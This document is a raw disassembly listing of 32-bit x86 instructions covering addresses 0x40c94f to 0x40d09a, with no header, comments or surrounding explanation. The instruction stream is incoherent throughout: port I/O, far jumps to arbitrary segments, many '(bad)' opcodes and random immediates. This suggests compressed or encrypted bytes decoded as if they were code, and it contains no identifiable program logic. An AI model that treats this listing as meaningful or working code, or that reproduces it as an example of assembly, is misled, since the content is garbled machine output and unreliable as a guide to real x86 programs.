  40c94f:	imul   ebp,DWORD PTR [ebp+0x6c],0x6c
  40c953:	retf   0x4e2e
  40c956:	sahf   
  40c957:	inc    ebp
  40c958:	or     DWORD PTR [ecx-0x56],0xffffffb7
  40c95c:	lods   eax,DWORD PTR ds:[esi]
  40c95d:	jb     0x40c9ca
  40c95f:	xchg   esp,eax
  40c960:	pop    ebx
  40c961:	pop    es
  40c962:	add    eax,0x627a5af7
  40c967:	call   0x15767a27
  40c96c:	mov    ebx,0xdc7e987c
  40c971:	jnp    0x40c969
  40c973:	push   cs
  40c974:	push   es
  40c975:	dec    ebx
  40c976:	test   DWORD PTR [ebx+0x11],ebx
  40c979:	out    dx,eax
  40c97a:	lds    eax,FWORD PTR [ecx]
  40c97c:	or     BYTE PTR [ebx-0xb],dh
  40c97f:	mov    esp,0x54c2e064
  40c984:	les    ecx,FWORD PTR [edi-0x50]
  40c987:	imul   edi,DWORD PTR [ebp-0x6a],0x2db11000
  40c98e:	mov    cl,0xb5
  40c990:	adc    al,BYTE PTR [esi+0x6d]
  40c993:	out    dx,al
  40c994:	pusha  
  40c995:	das    
  40c996:	jl     0x40c9fb
  40c998:	imul   ebp,DWORD PTR [ebx],0xffffffbf
  40c99b:	adc    dl,BYTE PTR [edi]
  40c99d:	retf   0x7100
  40c9a0:	mov    ebp,0xb6a96202
  40c9a5:	fdiv   DWORD PTR [eax-0x1d893a8b]
  40c9ab:	je     0x40ca24
  40c9ad:	adc    DWORD PTR ds:0xb8e5681,ebp
  40c9b3:	pop    ebx
  40c9b4:	mov    ecx,0x58e967b0
  40c9b9:	sahf   
  40c9ba:	int    0xe
  40c9bc:	or     BYTE PTR [ebx+0x6d2b5a09],0xb
  40c9c3:	fbstp  TBYTE PTR [ecx]
  40c9c5:	adc    ebp,DWORD PTR ds:[edx-0x4925bbe2]
  40c9cc:	ins    DWORD PTR es:[edi],dx
  40c9cd:	mov    bh,0x1f
  40c9cf:	sbb    eax,0x35570e8d
  40c9d4:	pushf  
  40c9d5:	sbb    ch,BYTE PTR [edx]
  40c9d7:	cmp    BYTE PTR [eax+0x58],bl
  40c9da:	fcomp  st(2)
  40c9dc:	jno    0x40c992
  40c9de:	push   ss
  40c9df:	mov    ch,0xca
  40c9e1:	mov    BYTE PTR [ebx-0x4d],dh
  40c9e4:	outs   dx,BYTE PTR ds:[esi]
  40c9e5:	or     eax,0xd607585a
  40c9ea:	or     eax,0x2d6ec430
  40c9ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9f0:	fistp  DWORD PTR [esi+0x7708d4b8]
  40c9f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9f7:	aam    0x67
  40c9f9:	add    al,0xec
  40c9fb:	add    ah,BYTE PTR [eax]
  40c9fd:	fcom   QWORD PTR [esi]
  40c9ff:	fisubr DWORD PTR [ebp+0xc]
  40ca02:	push   0xfa172d44
  40ca07:	out    dx,al
  40ca08:	mov    DWORD PTR [esi+ecx*4],esp
  40ca0b:	popa   
  40ca0c:	imul   esp,DWORD PTR [ecx-0x57],0x2e583783
  40ca13:	es pushf 
  40ca15:	fstp   DWORD PTR [ebx]
  40ca17:	sbb    ebp,DWORD PTR [ebp-0x1bb93198]
  40ca1d:	std    
  40ca1e:	cmp    al,0x48
  40ca20:	sub    eax,0xf56eb46d
  40ca25:	pop    ss
  40ca26:	daa    
  40ca27:	cmp    eax,0x7d77592d
  40ca2c:	cld    
  40ca2d:	push   edx
  40ca2e:	mov    ecx,0xb7ba23b1
  40ca33:	jl     0x40ca27
  40ca35:	ds ja  0x40cab6
  40ca38:	add    BYTE PTR ds:0xa0142e74,dl
  40ca3e:	mov    dh,0xc9
  40ca40:	add    eax,0xe9388838
  40ca45:	jecxz  0x40ca4e
  40ca47:	xchg   edi,eax
  40ca48:	xchg   edi,eax
  40ca49:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40ca4b:	add    BYTE PTR [esi],dh
  40ca4d:	dec    edx
  40ca4e:	push   esp
  40ca4f:	jno    0x40cacb
  40ca51:	cli    
  40ca52:	dec    ebx
  40ca53:	mov    dl,dh
  40ca55:	es push 0xefe69081
  40ca5b:	addr16 dec edx
  40ca5d:	inc    esp
  40ca5e:	pop    ebx
  40ca5f:	fiadd  DWORD PTR [ebp+0x12]
  40ca62:	popa   
  40ca63:	add    DWORD PTR [edi+edx*8-0x2069f594],edi
  40ca6a:	jp     0x40ca5d
  40ca6c:	repnz add BYTE PTR [ebx],ah
  40ca6f:	out    dx,eax
  40ca70:	loope  0x40cad8
  40ca72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca73:	sub    al,0xa
  40ca75:	push   eax
  40ca76:	mov    ebp,DWORD PTR [edx-0x3a]
  40ca79:	test   BYTE PTR [ebp+ebx*8-0x28],0x96
  40ca7e:	xchg   esi,eax
  40ca7f:	retf   
  40ca80:	out    dx,eax
  40ca81:	adc    BYTE PTR [ebx+ebp*2+0x52decfd5],0xa8
  40ca89:	lea    ecx,ds:0x465c05aa
  40ca8f:	xor    ecx,ebp
  40ca91:	ins    BYTE PTR es:[edi],dx
  40ca92:	xor    eax,0x11a96c15
  40ca97:	inc    eax
  40ca98:	cmp    BYTE PTR [esi+0x2b],ch
  40ca9b:	ins    DWORD PTR es:[edi],dx
  40ca9c:	test   DWORD PTR [edi],eax
  40ca9e:	push   ss
  40ca9f:	outs   dx,BYTE PTR ds:[esi]
  40caa0:	push   es
  40caa1:	aas    
  40caa2:	loopne 0x40caf0
  40caa4:	jecxz  0x40ca42
  40caa6:	stos   BYTE PTR es:[edi],al
  40caa7:	les    ebp,FWORD PTR [ebp-0x25]
  40caaa:	mov    dh,0x16
  40caac:	add    ah,al
  40caae:	stc    
  40caaf:	or     eax,DWORD PTR [ecx+ebp*8]
  40cab2:	add    bl,BYTE PTR [eax+0x4b8d5bb6]
  40cab8:	adc    DWORD PTR [edx-0x6f],esi
  40cabb:	(bad)  
  40cabc:	pop    ebx
  40cabd:	inc    edi
  40cabe:	fidiv  WORD PTR [ebp+esi*2-0x3e]
  40cac2:	ret    0xd6d6
  40cac5:	xor    eax,0xcaeba356
  40caca:	inc    ebx
  40cacb:	sub    DWORD PTR [ebp+0x6e],edx
  40cace:	ins    BYTE PTR es:[edi],dx
  40cacf:	fcmovnb st,st(2)
  40cad1:	sub    BYTE PTR [eax+eiz*2-0x11ee918f],dl
  40cad8:	(bad)  
  40cad9:	data16 mov ch,bl
  40cadc:	sub    BYTE PTR [ebp-0x25],0xfe
  40cae0:	sub    BYTE PTR [esp+ebp*8],0x17
  40cae4:	mov    ecx,0xbb2f736d
  40cae9:	mov    ch,0xd
  40caeb:	jno    0x40cb24
  40caed:	mov    dl,0x6
  40caef:	pop    ds
  40caf0:	xlat   BYTE PTR ds:[ebx]
  40caf1:	push   esi
  40caf2:	bound  ecx,QWORD PTR [edx]
  40caf4:	popf   
  40caf5:	cmp    ebp,DWORD PTR [esi]
  40caf7:	sub    eax,0x11c86d6d
  40cafc:	je     0x40cad6
  40cafe:	jno    0x40cb30
  40cb00:	outs   dx,BYTE PTR ds:[esi]
  40cb01:	inc    ecx
  40cb02:	rcl    edx,0x46
  40cb05:	mov    ebx,0xe26ab550
  40cb0a:	pop    ss
  40cb0b:	mov    cl,BYTE PTR [ebx+0x50]
  40cb0e:	add    bh,BYTE PTR [eax+0x1913cb6d]
  40cb14:	mov    al,0x6
  40cb16:	sub    DWORD PTR [esi+0x47],edx
  40cb19:	ins    DWORD PTR es:[edi],dx
  40cb1a:	or     esi,DWORD PTR [edi-0x15705d2]
  40cb20:	cld    
  40cb21:	imul   eax,DWORD PTR [ebp+0x3664bc6d],0x16
  40cb28:	mov    ds:0x2983daad,al
  40cb2d:	jae    0x40cb7f
  40cb2f:	jmp    0x74d4:0xb6ed5b51
  40cb36:	push   ebx
  40cb37:	rcl    BYTE PTR [esp+ebp*8],0x76
  40cb3b:	add    ah,0xf2
  40cb3e:	adc    dh,BYTE PTR [eax+0x3f5a1b95]
  40cb44:	xor    eax,0xdaeb892f
  40cb49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb4a:	shl    BYTE PTR [ebp+0x6bb72bda],cl
  40cb50:	inc    ecx
  40cb51:	sub    eax,0xb4175cd4
  40cb56:	ins    DWORD PTR es:[edi],dx
  40cb57:	pop    ss
  40cb58:	sub    BYTE PTR ds:0x539508b5,dl
  40cb5e:	xchg   ebx,eax
  40cb5f:	repnz outs dx,BYTE PTR ds:[esi]
  40cb61:	fwait
  40cb62:	mov    eax,ds:0xb5978a29
  40cb67:	(bad)  
  40cb68:	(bad)  
  40cb69:	das    
  40cb6a:	mov    al,0x89
  40cb6c:	add    BYTE PTR [ebx],bl
  40cb6e:	fld    TBYTE PTR [edi]
  40cb70:	out    0x43,eax
  40cb72:	(bad)  
  40cb74:	std    
  40cb75:	and    al,0xdf
  40cb77:	or     ebp,ebp
  40cb79:	mov    dh,0xd4
  40cb7b:	rcl    DWORD PTR [esi+0x5deae320],0x96
  40cb82:	push   0xb6dd2255
  40cb87:	sbb    cl,BYTE PTR [eax+0x46f94379]
  40cb8d:	neg    DWORD PTR [edi-0x17]
  40cb90:	add    esi,DWORD PTR [edi]
  40cb92:	sbb    al,BYTE PTR [eax+0x5c98d54f]
  40cb98:	leave  
  40cb99:	add    DWORD PTR [esi],0x8ae819c5
  40cb9f:	sbb    eax,0x2abd9c05
  40cba4:	jle    0x40cb65
  40cba6:	jno    0x40cc09
  40cba8:	test   eax,0x53a6675d
  40cbad:	mov    eax,ds:0x65caaa1a
  40cbb2:	or     dh,dl
  40cbb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbb5:	jbe    0x40cb58
  40cbb7:	leave  
  40cbb8:	jl     0x40cc21
  40cbba:	cmp    edx,DWORD PTR [edi]
  40cbbc:	cwde   
  40cbbd:	pop    esp
  40cbbe:	adc    eax,0xb6ddaa9a
  40cbc3:	lods   eax,DWORD PTR ds:[esi]
  40cbc4:	pop    es
  40cbc5:	fwait
  40cbc6:	or     eax,DWORD PTR [ecx+0x62]
  40cbc9:	xchg   esi,eax
  40cbca:	fmulp  st(0),st
  40cbcc:	fiadd  DWORD PTR [ebp+0x586edb6d]
  40cbd2:	cmp    BYTE PTR [ebp-0x17],0x4e
  40cbd6:	cmp    eax,0x6c0e0555
  40cbdb:	fmul   QWORD PTR [edx+0x37]
  40cbde:	sbb    eax,DWORD PTR [eax+eax*8]
  40cbe1:	xchg   edx,eax
  40cbe2:	add    bl,BYTE PTR [eax]
  40cbe4:	into   
  40cbe5:	or     al,0x3d
  40cbe7:	pop    eax
  40cbe8:	sub    al,BYTE PTR [eax+0x13]
  40cbeb:	fwait
  40cbec:	push   es
  40cbed:	jae    0x40cbc3
  40cbef:	fnsave cs:[esi+0x1cd69636]
  40cbf6:	pop    ebp
  40cbf7:	inc    ebp
  40cbf8:	and    eax,0x2c4c023a
  40cbfd:	pop    eax
  40cbfe:	fsubr  DWORD PTR [eax-0x5d]
  40cc01:	inc    edi
  40cc02:	push   esp
  40cc03:	mov    dl,0x94
  40cc05:	mov    eax,ds:0xad81b12b
  40cc0a:	fcomp  QWORD PTR [eax-0xf]
  40cc0d:	sahf   
  40cc0e:	mov    cl,0x7a
  40cc10:	call   0x6e8f2dbf
  40cc15:	mov    ch,0xdb
  40cc17:	and    BYTE PTR [eax-0x5085d68b],0x2
  40cc1e:	rcl    edx,0x5e
  40cc21:	mov    ch,0xb1
  40cc23:	sub    eax,0xbc200ab5
  40cc28:	inc    ecx
  40cc29:	lds    esi,FWORD PTR [eax]
  40cc2b:	xchg   DWORD PTR [ecx+0x13b412c0],esi
  40cc31:	lahf   
  40cc32:	outs   dx,DWORD PTR ds:[esi]
  40cc33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc34:	sub    eax,0xb6aa50b1
  40cc39:	mov    dh,0xff
  40cc3b:	mov    bl,0xc2
  40cc3d:	xor    DWORD PTR [esi],0x21
  40cc40:	add    dl,ch
  40cc42:	mov    edx,0x1c9dfb5
  40cc47:	aad    0x2b
  40cc49:	or     eax,0x9696da0f
  40cc4e:	mov    dh,0xe0
  40cc50:	sti    
  40cc51:	fnstsw WORD PTR [esi]
  40cc53:	inc    esp
  40cc54:	push   0x23
  40cc56:	and    BYTE PTR [edx+eiz*2],dh
  40cc59:	fistp  DWORD PTR [edx-0x5]
  40cc5c:	iret   
  40cc5d:	hlt    
  40cc5e:	cmp    eax,0xb0a7c9f5
  40cc63:	shr    BYTE PTR [esi],1
  40cc65:	ins    DWORD PTR es:[edi],dx
  40cc66:	iret   
  40cc67:	mov    ds:0x8fc40fbf,al
  40cc6c:	mov    ch,0x5f
  40cc6e:	sbb    ecx,DWORD PTR [ebp+0xe5eb6db]
  40cc74:	add    eax,0xc279290e
  40cc79:	setbe  BYTE PTR [ebx-0x4af493eb]
  40cc80:	pop    edx
  40cc81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc82:	out    dx,eax
  40cc83:	imul   eax,DWORD PTR [ecx+eax*4+0x4a],0x7da16185
  40cc8b:	test   DWORD PTR [edi+0x6da13791],esp
  40cc91:	mov    bh,0xd8
  40cc93:	pop    ss
  40cc94:	ror    BYTE PTR [ecx],0x25
  40cc97:	add    ebx,esp
  40cc99:	dec    eax
  40cc9a:	inc    esp
  40cc9b:	mov    esi,DWORD PTR [esi-0x22926924]
  40cca1:	pop    esp
  40cca2:	popa   
  40cca3:	stc    
  40cca4:	gs call 0xf5b6:0xebf5651f
  40ccac:	rcl    DWORD PTR [ecx-0x44],0x64
  40ccb0:	push   edx
  40ccb1:	add    bh,BYTE PTR [ebp+0xf]
  40ccb4:	mov    al,bh
  40ccb6:	outs   dx,DWORD PTR ds:[esi]
  40ccb7:	push   edi
  40ccb8:	mov    cl,0xf4
  40ccba:	mov    esp,0x60ae2fff
  40ccbf:	sub    bh,BYTE PTR [edi+0x74a176e6]
  40ccc5:	mov    esp,DWORD PTR [ebp-0x76]
  40ccc8:	sub    al,0xbe
  40ccca:	inc    esp
  40cccb:	pop    es
  40cccc:	loope  0x40ccdb
  40ccce:	das    
  40cccf:	ins    DWORD PTR es:[edi],dx
  40ccd0:	imul   esi,DWORD PTR [edi],0xffffffb6
  40ccd3:	loopne 0x40cd03
  40ccd5:	adc    eax,0x4ac57d26
  40ccda:	xlat   BYTE PTR ds:[ebx]
  40ccdb:	xchg   edx,eax
  40ccdc:	pop    ebx
  40ccdd:	or     eax,DWORD PTR [esi-0x5c91513e]
  40cce3:	icebp  
  40cce4:	ins    DWORD PTR es:[edi],dx
  40cce5:	ret    0xe53d
  40cce8:	in     eax,dx
  40cce9:	(bad)  
  40ccea:	(bad)  
  40cceb:	outs   dx,BYTE PTR ds:[esi]
  40ccec:	bound  esp,QWORD PTR [edx]
  40ccee:	or     bl,BYTE PTR [ebx+ebx*4-0x4e]
  40ccf2:	sub    al,dl
  40ccf4:	pop    esp
  40ccf5:	sbb    eax,0xad8595b6
  40ccfa:	push   ebp
  40ccfb:	and    BYTE PTR [ebx],0x76
  40ccfe:	aas    
  40ccff:	dec    edx
  40cd00:	dec    BYTE PTR [edi-0x24f4492a]
  40cd06:	mov    eax,0xa6825926
  40cd0b:	and    eax,0x26bc6105
  40cd10:	ins    BYTE PTR es:[edi],dx
  40cd11:	inc    eax
  40cd12:	sbb    ebx,ebx
  40cd14:	xor    DWORD PTR [ebx-0x823e192],eax
  40cd1a:	fsubr  DWORD PTR ds:0x6f6f2d6c
  40cd20:	aam    0x0
  40cd22:	dec    eax
  40cd23:	push   ss
  40cd24:	pop    eax
  40cd25:	push   eax
  40cd26:	popf   
  40cd27:	or     al,BYTE PTR [esi+eax*4]
  40cd2a:	pusha  
  40cd2b:	mov    ebx,0x147aa429
  40cd30:	push   ebx
  40cd31:	retf   
  40cd32:	ins    DWORD PTR es:[edi],dx
  40cd33:	mov    ah,0x85
  40cd35:	sbb    esi,DWORD PTR [esp+ebp*4]
  40cd38:	and    ch,cl
  40cd3a:	jle    0x40cd3a
  40cd3c:	mov    bl,BYTE PTR [ebx]
  40cd3e:	mov    dh,0x2b
  40cd40:	fsubr  DWORD PTR [esi-0x2d]
  40cd43:	into   
  40cd44:	adc    eax,edx
  40cd46:	xchg   edx,eax
  40cd47:	adc    DWORD PTR [ebp+0x1b681dc9],0x5f
  40cd4e:	fcmovnbe st,st(1)
  40cd50:	pop    ecx
  40cd51:	mov    ebx,0x46b12af1
  40cd56:	sbb    ah,BYTE PTR [ecx+0x63]
  40cd59:	mov    eax,ds:0x4011ef95
  40cd5e:	or     DWORD PTR [eax],esi
  40cd60:	or     BYTE PTR [edx+0x6d8ddb4b],dh
  40cd66:	sbb    DWORD PTR [esi],ecx
  40cd68:	sbb    al,0x4b
  40cd6a:	aaa    
  40cd6b:	test   al,0xe3
  40cd6d:	fwait
  40cd6e:	sti    
  40cd6f:	das    
  40cd70:	add    esp,ebx
  40cd72:	push   0x2fb6204b
  40cd77:	aas    
  40cd78:	cmp    eax,0xbab6bace
  40cd7d:	xor    BYTE PTR [ebx+eiz*2-0x356b6b7d],bh
  40cd84:	push   es
  40cd85:	mov    cl,0xd1
  40cd87:	xchg   esi,eax
  40cd88:	and    eax,0x37081b34
  40cd8d:	dec    esi
  40cd8e:	or     BYTE PTR [ebp+0x21b6d6db],0xa0
  40cd95:	push   0x56e2910d
  40cd9a:	dec    eax
  40cd9b:	int3   
  40cd9c:	js     0x40cd52
  40cd9e:	adc    al,0xb4
  40cda0:	test   DWORD PTR [esi],ebx
  40cda2:	xor    al,0x33
  40cda4:	sar    DWORD PTR [ebp-0x492f05d4],1
  40cdaa:	ins    BYTE PTR es:[edi],dx
  40cdab:	(bad)  
  40cdac:	ficomp WORD PTR [ecx-0x29]
  40cdaf:	inc    esi
  40cdb0:	ds dec ebp
  40cdb2:	push   ebx
  40cdb3:	fnsave [esi-0xdd2dc53]
  40cdb9:	sbb    eax,0x38d0539b
  40cdbe:	mov    dl,0xc7
  40cdc0:	(bad)  [esi]
  40cdc2:	test   al,0xad
  40cdc4:	sbb    eax,0x2177bcad
  40cdc9:	fimul  DWORD PTR [eax+0x2]
  40cdcc:	or     ebp,DWORD PTR [ebx+ebx*1+0x5b]
  40cdd0:	dec    ebp
  40cdd1:	jp     0x40ce0f
  40cdd3:	stos   DWORD PTR es:[edi],eax
  40cdd4:	imul   ebp,esi,0x12
  40cdd7:	clc    
  40cdd8:	mov    ebx,ebx
  40cdda:	add    cl,BYTE PTR [ebp-0x533d2a0]
  40cde0:	add    eax,0xa57cf7e1
  40cde5:	ins    DWORD PTR es:[edi],dx
  40cde6:	mov    ds:0xef006a7c,eax
  40cdeb:	sub    eax,0xa647c360
  40cdf0:	xchg   edx,eax
  40cdf1:	fistp  DWORD PTR [eax+0x68]
  40cdf4:	fstp   TBYTE PTR [edi*4-0x321c5d50]
  40cdfb:	ss or  al,0x32
  40cdfe:	enter  0xd1b1,0x41
  40ce02:	jo     0x40ce25
  40ce04:	(bad)  
  40ce05:	call   0x6c858e51
  40ce0a:	ins    BYTE PTR es:[edi],dx
  40ce0b:	(bad)  [esi-0x480119d6]
  40ce11:	mov    edi,0x3f1f4112
  40ce16:	test   DWORD PTR [di],ebx
  40ce19:	push   esp
  40ce1a:	sub    ebp,DWORD PTR [ebp+0x69]
  40ce1d:	mov    esp,0x6d16b4ba
  40ce22:	mov    bh,0x85
  40ce24:	repnz pop DWORD PTR [eax]
  40ce27:	sbb    dl,bh
  40ce29:	inc    ebx
  40ce2a:	adc    ebx,edi
  40ce2c:	lea    eax,ds:0xdca15c9b
  40ce32:	mov    dh,0xad
  40ce34:	sbb    DWORD PTR [ebx+eiz*2-0x24a0efa4],edi
  40ce3b:	jae    0x40ce19
  40ce3d:	ror    BYTE PTR [ebp-0xb5a9493],1
  40ce43:	xlat   BYTE PTR ds:[ebx]
  40ce44:	jge    0x40ce19
  40ce46:	sbb    ecx,eax
  40ce48:	inc    eax
  40ce49:	pop    eax
  40ce4a:	mov    dh,0x6d
  40ce4c:	sti    
  40ce4d:	enter  0x5bd5,0x9b
  40ce51:	mov    dl,0xfe
  40ce53:	lods   al,BYTE PTR ds:[esi]
  40ce54:	cmp    edi,DWORD PTR [esi-0x2527692b]
  40ce5a:	es jno 0x40ceb3
  40ce5d:	fild   DWORD PTR [edx]
  40ce5f:	sub    al,0x45
  40ce61:	xor    al,0xc1
  40ce63:	lea    ebp,[ebp+0x47a7dd4f]
  40ce69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce6a:	push   ds
  40ce6b:	call   0xc9f13616
  40ce70:	inc    edx
  40ce71:	add    DWORD PTR [edx+0x11],ebp
  40ce74:	dec    esp
  40ce75:	cmp    ah,dh
  40ce77:	fdiv   DWORD PTR [esi]
  40ce79:	inc    edi
  40ce7a:	(bad)  [edx]
  40ce7c:	adc    al,0x2a
  40ce7e:	rol    BYTE PTR [ecx+0x26],1
  40ce81:	or     edx,0x34
  40ce84:	push   ecx
  40ce85:	pop    ebx
  40ce86:	fs mov ?,eax
  40ce89:	mov    ebp,DWORD PTR [ebp+0x49]
  40ce8c:	iret   
  40ce8d:	xchg   edi,eax
  40ce8e:	cs sub eax,0x5df55c55
  40ce94:	(bad)  
  40ce96:	mov    al,ds:0x169c3200
  40ce9b:	stos   DWORD PTR es:[edi],eax
  40ce9c:	adc    DWORD PTR [ebp-0x6b904573],esi
  40cea2:	lods   eax,DWORD PTR ds:[esi]
  40cea3:	and    DWORD PTR [edx+eax*8+0x1b616176],ebp
  40ceaa:	mov    ch,0x3e
  40ceac:	pop    es
  40cead:	lahf   
  40ceae:	setb   BYTE PTR [ebx]
  40ceb1:	inc    esi
  40ceb2:	shr    BYTE PTR [ebp-0x25],cl
  40ceb5:	retf   0x23a9
  40ceb8:	lea    ebx,[edx]
  40ceba:	jp     0x40cec1
  40cebc:	ss lahf 
  40cebe:	vmovhpd xmm2,xmm0,QWORD PTR [edi]
  40cec2:	mov    dh,0x2
  40cec4:	cli    
  40cec5:	mov    BYTE PTR [edx+0xa4db96],al
  40cecb:	or     BYTE PTR [eax+0x452c2f2d],al
  40ced1:	inc    eax
  40ced2:	mov    esi,gs
  40ced4:	lods   eax,DWORD PTR ds:[esi]
  40ced5:	add    BYTE PTR [ebx],dl
  40ced7:	out    0x96,eax
  40ced9:	das    
  40ceda:	sub    eax,0xa468ec2d
  40cedf:	or     ebp,DWORD PTR [ebp-0x17ff9133]
  40cee5:	adc    al,0x6a
  40cee7:	ins    BYTE PTR es:[edi],dx
  40cee8:	pop    ss
  40cee9:	mov    dh,0xaf
  40ceeb:	ins    DWORD PTR es:[edi],dx
  40ceec:	xchg   edi,eax
  40ceed:	push   edx
  40ceee:	ret    0xf483
  40cef1:	sbb    BYTE PTR [esi-0x823d34a],dh
  40cef7:	push   esp
  40cef8:	rcr    DWORD PTR [ebx-0x21],1
  40cefb:	test   bh,ch
  40cefd:	outs   dx,BYTE PTR ds:[esi]
  40cefe:	xor    al,0x58
  40cf00:	fcmovu st,st(0)
  40cf02:	pop    edx
  40cf03:	sbb    eax,0x75cf67d3
  40cf08:	inc    esp
  40cf09:	js     0x40ceb6
  40cf0b:	add    DWORD PTR [ebx+0x5c],edx
  40cf0e:	xchg   edi,eax
  40cf0f:	jae    0x40cf0c
  40cf11:	scas   eax,DWORD PTR es:[edi]
  40cf12:	cmp    al,0x38
  40cf14:	mov    cs,WORD PTR [ebx]
  40cf16:	fwait
  40cf17:	test   eax,0x7d702176
  40cf1c:	stos   DWORD PTR es:[edi],eax
  40cf1d:	sti    
  40cf1e:	sub    eax,0x3c0504e2
  40cf23:	fisubr DWORD PTR [esi-0x74]
  40cf26:	push   ds
  40cf27:	test   ebp,0xb6ed4c83
  40cf2d:	mov    ch,0xb1
  40cf2f:	dec    eax
  40cf30:	jno    0x40cf71
  40cf32:	cmp    DWORD PTR [ecx+0x7bed89e2],edx
  40cf38:	push   ebx
  40cf39:	lods   eax,DWORD PTR ds:[esi]
  40cf3a:	ins    DWORD PTR es:[edi],dx
  40cf3b:	imul   edx,DWORD PTR [eax+ecx*1],0x4a
  40cf3f:	pop    es
  40cf40:	loopne 0x40cf55
  40cf42:	test   eax,0xb6db70a9
  40cf47:	adc    BYTE PTR [ecx+0x2f6be620],bh
  40cf4d:	sub    al,0x24
  40cf4f:	cmp    eax,0xdadc14a7
  40cf54:	ins    DWORD PTR es:[edi],dx
  40cf55:	sbb    DWORD PTR [eax+0x23953884],0xffffff90
  40cf5c:	dec    edx
  40cf5d:	and    eax,0x69d0bb57
  40cf62:	aas    
  40cf63:	cli    
  40cf64:	aaa    
  40cf65:	mov    cl,0xe0
  40cf67:	icebp  
  40cf68:	xchg   edx,eax
  40cf69:	sub    DWORD PTR [eax-0x23bd5530],edi
  40cf6f:	mov    ds:0xd2788796,eax
  40cf74:	lods   eax,DWORD PTR ds:[esi]
  40cf75:	test   DWORD PTR [esi-0x2022d696],esi
  40cf7b:	mov    DWORD PTR ds:0xdc5914a4,edi
  40cf81:	fcmovbe st,st(6)
  40cf83:	ret    0x6adc
  40cf86:	retf   
  40cf87:	jo     0x40cf9f
  40cf89:	pop    esp
  40cf8a:	inc    ecx
  40cf8b:	mov    edx,DWORD PTR [edi]
  40cf8d:	push   esi
  40cf8e:	mov    ch,0xd0
  40cf90:	add    eax,ecx
  40cf92:	cdq    
  40cf93:	mov    ebx,DWORD PTR [ebx-0x27a496d1]
  40cf99:	mov    dh,0x3b
  40cf9b:	(bad)  
  40cf9c:	and    BYTE PTR [edi],cl
  40cf9e:	pop    ebx
  40cf9f:	out    0x11,al
  40cfa1:	retf   
  40cfa2:	inc    edi
  40cfa3:	ins    BYTE PTR es:[edi],dx
  40cfa4:	dec    ebp
  40cfa5:	jo     0x40d010
  40cfa7:	not    DWORD PTR [ebx-0xb]
  40cfaa:	jo     0x40cf8c
  40cfac:	leave  
  40cfad:	adc    esi,edx
  40cfaf:	sub    eax,0x120bb6b4
  40cfb4:	xchg   edx,eax
  40cfb5:	and    esi,DWORD PTR ds:0x8a2b6d32
  40cfbb:	sbb    ch,BYTE PTR ss:[edx-0x45]
  40cfbf:	into   
  40cfc0:	test   al,0x5f
  40cfc2:	push   ebx
  40cfc3:	and    BYTE PTR [ebp+0x76935a86],bl
  40cfc9:	popa   
  40cfca:	imul   esi,DWORD PTR [edi],0x45
  40cfcd:	in     eax,0xd
  40cfcf:	sub    DWORD PTR [edx-0x7a],ecx
  40cfd2:	call   0xa5da:0x1a56edb7
  40cfd9:	test   DWORD PTR [eax],edx
  40cfdb:	cmp    bl,BYTE PTR [ecx-0x73]
  40cfde:	cmp    eax,0xb62ad558
  40cfe4:	lods   eax,DWORD PTR ds:[esi]
  40cfe5:	test   eax,0x42dd151d
  40cfea:	enter  0xb841,0xb0
  40cfee:	mov    cl,0xd1
  40cff0:	dec    eax
  40cff1:	cmp    dx,WORD PTR [ebp+edi*8+0x6a]
  40cff6:	clc    
  40cff7:	stos   BYTE PTR es:[edi],al
  40cff8:	loope  0x40d022
  40cffa:	stos   BYTE PTR es:[edi],al
  40cffb:	push   esp
  40cffc:	loop   0x40d06f
  40cffe:	in     eax,dx
  40cfff:	ins    BYTE PTR es:[edi],dx
  40d000:	fist   DWORD PTR [esi-0x48]
  40d003:	mov    cl,0x6e
  40d005:	push   esp
  40d006:	mov    esi,0xbbe6c53e
  40d00b:	pop    ecx
  40d00c:	inc    esi
  40d00d:	or     ecx,DWORD PTR [ebx-0x4c]
  40d010:	adc    BYTE PTR cs:[ebp+eax*8-0x5a],cl
  40d015:	pop    ds
  40d016:	jnp    0x40d037
  40d018:	push   es
  40d019:	pop    eax
  40d01a:	pop    edx
  40d01b:	sub    BYTE PTR [eax-0x70],dl
  40d01e:	mov    ebx,0x6ef2b62f
  40d023:	pop    ebx
  40d024:	add    ebx,edx
  40d026:	out    0xf0,eax
  40d028:	adc    BYTE PTR [esi+0x53124a17],bl
  40d02e:	sbb    ebp,DWORD PTR [ebx+ebx*8+0x56]
  40d032:	clc    
  40d033:	clc    
  40d034:	pop    esp
  40d035:	xor    edi,DWORD PTR [ebx]
  40d037:	pop    edx
  40d038:	inc    esp
  40d039:	enter  0x500a,0xbb
  40d03d:	xchg   ebp,eax
  40d03e:	or     BYTE PTR [eax],cl
  40d040:	fldcw  WORD PTR [edx+0x47]
  40d043:	xchg   ebp,eax
  40d044:	pusha  
  40d045:	sub    DWORD PTR [ebp-0x25],0xffffff92
  40d049:	popf   
  40d04a:	sbb    eax,0xc8be8cca
  40d04f:	test   DWORD PTR [ebx+0x7196d1b4],edi
  40d055:	(bad)  
  40d056:	cmp    BYTE PTR [ecx+0x4bf4e01e],al
  40d05c:	add    ch,BYTE PTR [eax+0x126b636d]
  40d062:	sub    edi,DWORD PTR [esi+esi*1]
  40d065:	in     al,0xe9
  40d067:	jno    0x40cfff
  40d069:	fcom   DWORD PTR [esi]
  40d06b:	sbb    bh,BYTE PTR [edi]
  40d06d:	mov    ebp,0x9d239507
  40d072:	push   0xffffffde
  40d074:	and    DWORD PTR [eax-0x2e1f2523],esp
  40d07a:	pop    ebx
  40d07b:	lods   eax,DWORD PTR ds:[esi]
  40d07c:	aaa    
  40d07d:	mov    bl,0x6
  40d07f:	shr    BYTE PTR [ebp+0x136442d],1
  40d085:	aam    0x68
  40d087:	nop
  40d088:	mov    eax,ds:0xd0b0b1b
  40d08d:	xor    cl,BYTE PTR [edi+ebp*4-0x4bbcdad0]
  40d094:	push   ecx
  40d095:	or     dl,BYTE PTR [eax-0x20]
  40d098:	push   ss
  40d099:	outs   dx,DWORD PTR ds:[esi]
  40d09a:	cwde   
